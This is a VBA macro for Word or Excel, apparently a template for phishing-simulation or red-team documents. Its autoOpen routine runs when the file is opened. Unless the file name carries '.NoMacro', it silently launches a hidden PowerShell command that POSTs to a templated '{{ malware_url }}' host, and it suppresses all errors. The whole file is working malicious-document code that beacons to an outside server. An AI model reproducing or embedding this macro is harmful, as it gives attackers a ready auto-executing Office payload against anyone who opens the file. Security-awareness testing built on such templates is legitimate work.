Option Explicit

Sub psScript()
    Dim script As String
    script = "curl -Uri '{{ malware_url }}' -Method Post -Headers @{'Content-Type' = 'application/x-www-form-urlencoded'} -Body 'email=makro@test'"

    Dim output As String
    output = RunShellCommand(script)

    'MsgBox output
End Sub

Function RunShellCommand(command As String) As String
    Dim shell As Object
    Set shell = CreateObject("WScript.Shell")

    Dim output As String
    output = shell.Run("powershell.exe -Command " & command, 0)
    

    RunShellCommand = output
End Function

Sub autoOpen()

    'some lines may produce error depending on the circumstances but we want to ignore these errors 
    On Error Resume Next
    
    'variables are self explanatory 
    Dim is_word As Boolean 
    Dim is_excel As Boolean 
    Dim file_name As String
    Dim app_name As String
    is_word = False
    is_excel = False 
    file_name = ""
    app_name = Application.Name	
	
    If app_name = "Microsoft Word" Then

        'set flags, doc and filename 
        Dim doc As Document
        Set doc = ActiveDocument
        is_word = True
        file_name = doc.Name	

    ElseIf app_name = "Microsoft Excel" Then 

        'set flags, wb and filename 
        Dim wb As Workbook 
        Set wb = ActiveWorkbook	
        is_excel = True	
        file_name = wb.Name 

    End If

    ' nomacro/macro logic
    If Split(file_name,".")(1) = "NoMacro" Then
        'if you appended ".NoMacro" to the filename of your ms office file
        Exit Sub
    Else
        'malicious code here, do not run on your laptop
        Call psScript
    End If
    
End Sub
 
